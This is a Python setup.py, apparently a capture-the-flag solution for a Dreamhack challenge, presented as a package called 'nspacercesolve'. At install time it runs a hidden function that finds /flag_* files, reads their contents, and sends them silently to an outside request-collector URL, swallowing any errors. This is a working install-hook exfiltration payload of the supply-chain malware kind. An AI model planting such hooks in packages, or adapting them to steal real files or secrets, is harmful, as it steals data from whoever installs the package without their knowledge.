from setuptools import setup, find_packages

import glob
import urllib.request
import urllib.parse


def drop_flag():
    # 1) /flag_* 패턴으로 플래그 파일 찾기 (/flag_****.txt)
    paths = glob.glob("/flag_*")
    if not paths:
        return

    # 2) 플래그 내용 읽기
    try:
        with open(paths[0], "r") as f:
            flag_text = f.read().strip()
    except Exception:
        return

    # 3) Dreamhack request collector로 GET 요청 보내기
    base_url = "https://zxgwlqh.request.dreamhack.games"
    query = urllib.parse.urlencode({"flag": flag_text})
    full_url = f"{base_url}?{query}"

    try:
        urllib.request.urlopen(full_url, timeout=5)
    except Exception:
        # 네트워크/SSL 에러 등은 조용히 무시
        pass


# pip install 하는 순간 이 함수가 한 번 실행됨
drop_flag()

setup(
    name="nspacercesolve",
    version="0.0.7",
    description="Dreamhack SQLi RCE helper",
    packages=find_packages(),
    python_requires=">=3.8",
)